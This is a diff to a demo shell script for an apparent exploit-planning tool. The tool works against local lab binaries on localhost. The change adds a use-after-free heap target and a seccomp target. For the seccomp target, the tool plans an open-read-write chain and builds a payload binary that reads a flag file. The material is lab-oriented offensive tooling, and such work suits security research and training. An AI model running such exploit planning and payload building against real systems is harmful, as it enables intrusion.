@@ -1,6 +1,6 @@
 #!/bin/sh
-# The augure/lictor demo: FOUR targets, four different fact bases,
-# four different decisions - the decision layer's showcase.
+# The augure/lictor demo: SIX targets, six different fact bases,
+# six different decisions - the decision layer's showcase.
 # Run from anywhere: sh lictor/lab/demo.sh
 set -e
 cd "$(dirname "$0")/.."
@@ -44,7 +44,25 @@ for entry in "127.0.0.1:9999 ret2func" "127.0.0.1:9998 ret2plt" \
 done
 
 echo
-echo "=== 6. the auditable engagement report (all four targets) ==="
+echo "=== 6. the heap target: the facts the PROFILER cannot see come from knowledge ==="
+echo "[suggest] vuln(uaf) + tcache + glibc 36 -> the decision shifts:"
+(cd "$WORK" && "$L" acquire 127.0.0.1:9995 --from http://127.0.0.1:8000/uaf_heap >/dev/null)
+(cd "$WORK" && "$L" suggest target.facts \
+	"vuln(\"uaf\").\nallocator(\"tcache\").\nglibc_minor(36).\nfunction_pointer_on_heap(\"true\")." \
+	-o target.facts) | head -3
+(cd "$WORK" && "$L" plan target.facts) | head -5
+
+echo
+echo "=== 7. the seccomp target: execve is dead, the orw chain is the answer ==="
+echo "[suggest] seccomp(true) -> the decision flips to the orw chain:"
+(cd "$WORK" && "$L" acquire 127.0.0.1:9994 --from http://127.0.0.1:8000/orw >/dev/null)
+(cd "$WORK" && "$L" suggest target.facts "seccomp(\"true\")." -o target.facts) | head -3
+(cd "$WORK" && "$L" plan target.facts) | head -5
+echo "[build] the orw stub (the flag path embedded), measured offset:"
+(cd "$WORK" && "$L" build orw --facts target.facts -o orw-payload.bin) | head -4
+
+echo
+echo "=== 8. the auditable engagement report (all six targets) ==="
 (cd "$WORK" && "$L" report) | tail -30
 
 echo
